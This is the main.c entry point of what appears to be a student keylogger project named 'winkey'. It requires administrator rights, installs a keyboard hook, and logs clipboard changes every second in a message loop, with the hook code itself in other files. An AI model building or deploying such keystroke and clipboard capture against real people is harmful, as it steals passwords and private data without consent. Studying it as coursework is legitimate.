/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/08 13:00:34 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/21 16:17:17 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma region "Includes"

	#include "winkey.h"

#pragma endregion

#pragma region "Variables"

	// Aqui van las variables, si las hay

#pragma endregion

#pragma region "Is Admin"

	BOOL IsAdmin(void) {
		BOOL isAdmin = FALSE;
		HANDLE hToken = NULL;
		
		if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
			TOKEN_ELEVATION elevation;
			DWORD dwSize = sizeof(TOKEN_ELEVATION);
			if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
				isAdmin = elevation.TokenIsElevated;       
			CloseHandle(hToken);
		}
		
		return (isAdmin);
	}

#pragma endregion

#pragma region "Main"

	int main(void) {
		// check if it has administrator privileges
		if (!IsAdmin()) return (printf("\nAdministrator privileges are required\n"), 1);
		
		// Activar el hook
		if (!ActivateHook()) {
			return 1;
		}
		
		// Loop principal para manterner el hook activo
		MSG msg;
		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, "Global\\WinkeyTerminateEvent");

		// Para controlar el tiempo del chequeo del portapapeles (tiempo en ms desde que incio windows)
		DWORD lastClipboardCheck = GetTickCount();
		
		while(TRUE)
		{
			// Procesar mensajes (incluyendo eventos del hook)
			while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
				if (msg.message == WM_QUIT) {
					break;
				}
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}

			if (WaitForSingleObject(hEvent, 10) == WAIT_OBJECT_0) {
				break;
			}

			// Comprobar el portapapeles cada 1000 ms (1 segundo)
			if (GetTickCount() - lastClipboardCheck > 1000) {
				LogClipboardIfChanged();
				lastClipboardCheck = GetTickCount(); // Reiniciamos contador
			}

			Sleep(10);
		}

		CloseHandle(hEvent);
		DeactivateHook();
		return (0);
	}

#pragma endregion
